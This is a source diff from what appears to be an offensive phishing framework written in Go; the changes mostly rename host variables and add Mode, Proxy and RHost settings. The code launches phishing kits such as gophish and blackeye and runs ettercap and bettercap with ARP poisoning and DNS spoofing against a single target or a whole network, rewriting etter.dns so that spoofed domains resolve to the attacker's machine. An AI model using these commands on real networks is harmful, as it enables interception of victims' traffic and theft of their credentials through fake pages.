@@ -15,18 +15,21 @@ import(
 )
 
 var(
+    Mode = "all"
     Name = "beef"
     Pass = "Jesus"
     Iface = "eth0"
     LPort = "9999"
+    Proxy = ""
+    RHost = ""
     Spoofer = "ettercap"
     FakeDns = "Jesus is coming soon"
 
-    Lhost = LhostIp
-    LhostIp, _ = utils.GetDefaultIP()
+    LHost = LHostIp
+    LHostIp, _ = utils.GetDefaultIP()
     scanner = bufio.NewScanner(os.Stdin)
     Gateway, _ = utils.GetDefaultGatewayIP()
-    Input, Rhost, Proxy, Function, Target string
+    Input, Function, Target string
     CertDir, OutPutDir, KeyPath, CertPath, ToolsDir, RokyPath, WordList = utils.DirLocations()
 )
 
@@ -42,7 +45,7 @@ var defaultValues = map[string]string{
     "spoofer": "ettercap",
     "fakedns": "Jesus is coming soon",
 
-    "lhost": LhostIp,
+    "lhost": LHostIp,
     "output": OutPutDir,
 }
 
@@ -111,7 +114,7 @@ func executeCommand(cmd string) bool {
 
         {[]string{"info"}, menus.HelpInfoPhishers},
         {[]string{"m", "menu"}, menus.MenuSeven},
-        {[]string{"option", "options", "show option", "show options"}, menus.PhishersOptions},
+        {[]string{"option", "options", "show option", "show options"}, func() { menus.PhishersOptions(Mode, RHost, Proxy) }},
         {[]string{"func", "funcs", "functions", "show func", "list funcs", "show funcs", "show function", "list function", "list functions", "show functions", "module", "modules", "list module", "show module", "list modules", "show modules", "show all", "list all"}, menus.ListPhishersFunctions},
 
         {[]string{"1", "run 1", "use 1", "exec 1", "start 1", "launch 1", "exploit 1", "execute 1", "run gophish", "use gophish", "exec gophish", "start gophish", "launch gophish", "exploit gophish", "execute gophish"}, func() { GoPhish() }},
@@ -167,11 +170,11 @@ func handleSetCommand(parts []string) {
 
         "name": &Name,
         "iface": &Iface,
-        "rhost": &Rhost,
+        "rhost": &RHost,
         "lport": &LPort,
-        "target": &Rhost,
+        "target": &RHost,
         "proxies": &Proxy,
-        "lhost": &LhostIp,
+        "lhost": &LHostIp,
         "password": &Pass,
         "func": &Function,
         "funcs": &Function,
@@ -201,11 +204,11 @@ func handleUnsetCommand(parts []string) {
 
         "name": &Name,
         "iface": &Iface,
-        "rhost": &Rhost,
+        "rhost": &RHost,
         "lport": &LPort,
-        "target": &Rhost,
+        "target": &RHost,
         "proxies": &Proxy,
-        "lhost": &LhostIp,
+        "lhost": &LHostIp,
         "password": &Pass,
         "func": &Function,
         "funcs": &Function,
@@ -340,7 +343,7 @@ func CyberPhish() {
     subprocess.Popen(`cd %s/phishers/cyberphish/; python3 cyberphish.py`, ToolsDir)
 }
 
-func NinjaEttercap(Lhost string, Gateway string, FakeDns string, Rhost string, Iface string, Target string) {
+func NinjaEttercap(LHost string, Gateway string, FakeDns string, RHost string, Iface string, Target string) {
     scanner.Scan()
     Input := scanner.Text()
     switch strings.ToLower(Input) {
@@ -365,7 +368,7 @@ func NinjaEttercap(Lhost string, Gateway string, FakeDns string, Rhost string, I
         filePathT := "/etc/ettercap/etter.dns.bak_africana"
         if _, err := os.Stat(filePathT); os.IsNotExist(err) {
             subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
-            newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n%s%s%s", FakeDns, " A ", Lhost)
+            newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n%s%s%s", FakeDns, " A ", LHost)
             filesToReplacements := map[string]map[string]string{
                 "/etc/ettercap/etter.dns": {
                     `# vim:ts=8:noexpandtab`: newString,
@@ -373,7 +376,7 @@ func NinjaEttercap(Lhost string, Gateway string, FakeDns string, Rhost string, I
             }
         utils.Editors(filesToReplacements)
         }
-        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "ettercap -TQi %s -M arp:remote -P dns_spoof /%s// /%s//" &`, Iface, Rhost, Gateway)
+        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "ettercap -TQi %s -M arp:remote -P dns_spoof /%s// /%s//" &`, Iface, RHost, Gateway)
         subprocess.Popen(`cd %s/phishers/blackeye; bash blackeye.sh`, ToolsDir)
         fmt.Println()
         subprocess.Popen(`rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
@@ -396,7 +399,7 @@ func NinjaEttercap(Lhost string, Gateway string, FakeDns string, Rhost string, I
         filePathT := "/etc/ettercap/etter.dns.bak_africana"
         if _, err := os.Stat(filePathT); os.IsNotExist(err) {
             subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
-            newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n%s%s%s", FakeDns, " A ", Lhost)
+            newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n%s%s%s", FakeDns, " A ", LHost)
             filesToReplacements := map[string]map[string]string{
                 "/etc/ettercap/etter.dns": {
                     `# vim:ts=8:noexpandtab`: newString,
@@ -415,14 +418,14 @@ func NinjaEttercap(Lhost string, Gateway string, FakeDns string, Rhost string, I
     fmt.Println()
 }
 
-func NinjaBettercap(Lhost string, Gateway string, FakeDns string, Rhost string, Iface string, Target string) {
+func NinjaBettercap(LHost string, Gateway string, FakeDns string, RHost string, Iface string, Target string) {
     if Target == ""{
         fmt.Printf("\n%s[!] %sMissing required parameter SPOOFER. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
     }
     switch strings.ToLower(Target) {
     case "one":
-        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "bettercap --iface %s -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set dns.spoof.domains *.*; set net.sniff.verbose true; arp.spoof on; dns.spoof on; active'"&`, Iface, Rhost)
+        subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "bettercap --iface %s -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set dns.spoof.domains *.*; set net.sniff.verbose true; arp.spoof on; dns.spoof on; active'"&`, Iface, RHost)
         subprocess.Popen(`cd %s/phishers/blackeye; bash blackeye.sh`, ToolsDir)
     case "all":
         subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "bettercap --iface %s -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set dns.spoof.domains *.*; set net.sniff.verbose true; set dns.spoof.all true; arp.spoof on; dns.spoof on; active'"&`, Iface)
@@ -433,16 +436,16 @@ func NinjaBettercap(Lhost string, Gateway string, FakeDns string, Rhost string, 
     }
 }
 
-func NinjaPhish(Spoofer string, Lhost string, Gateway string, FakeDns string, Rhost string, Iface string, Target string) {
+func NinjaPhish(Spoofer string, LHost string, Gateway string, FakeDns string, RHost string, Iface string, Target string) {
     if Spoofer == ""{
         fmt.Printf("\n%s[!] %sMissing required parameter SPOOFER. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
     }
     switch strings.ToLower(Spoofer) {
     case "ettercap":
-         NinjaEttercap(Lhost, Gateway, FakeDns, Rhost, Iface, Target)
+         NinjaEttercap(LHost, Gateway, FakeDns, RHost, Iface, Target)
     case "bettercap":
-         NinjaBettercap(Lhost, Gateway, FakeDns, Rhost, Iface, Target)
+         NinjaBettercap(LHost, Gateway, FakeDns, RHost, Iface, Target)
     default:
         fmt.Printf("\n%s[!] %sMissing required parameter SPOOFER. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
